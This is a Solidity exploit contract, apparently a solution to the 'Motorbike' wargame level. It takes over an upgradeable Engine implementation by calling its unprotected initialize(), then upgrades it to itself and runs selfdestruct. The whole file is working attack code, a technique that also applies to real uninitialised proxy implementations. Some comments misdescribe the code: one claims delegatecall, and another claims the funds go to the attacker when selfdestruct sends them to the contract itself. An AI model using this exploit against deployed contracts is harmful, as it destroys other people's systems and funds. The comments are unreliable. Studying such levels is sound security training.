// SPDX-License-Identifier: MIT

import "./Motorbike.sol";
pragma solidity <0.7.0;

contract MotorbikeAttack {
    Engine victimContract;

    constructor(address _victimContract) public {
        victimContract = Engine(address(_victimContract));
    }

    function attack() public {
        // 3. Initialization of the `Engine` contract - The `initialize()` function in the `Engine` contract is called via `delegatecall`, allowing the attacker to initialize the contract and take over the `upgrader` role.
        victimContract.initialize();

        // 4. Upgrade of the `Engine` contract - the `upgradeToAndCall()` function in the Engine contract is called with the address of the attacker's `MotorbikeAttack` contract and the `destroy()` function as data. This function upgrades the `Engine` contract to a new implementation, enabling the execution of the `destroy()` function in the attacker's contract.
        victimContract.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
    }

    // 5. Calling the `destroy()` function - the `destroy()` function in the `MotorbikeAttack` contract is called, resulting in the selfdestruction of the contract and transferring the entire balance to the attacker's address.
    function destroy() public {
        selfdestruct(payable(address(this)));
    }

    fallback() external payable {}

    receive() external payable {}
}
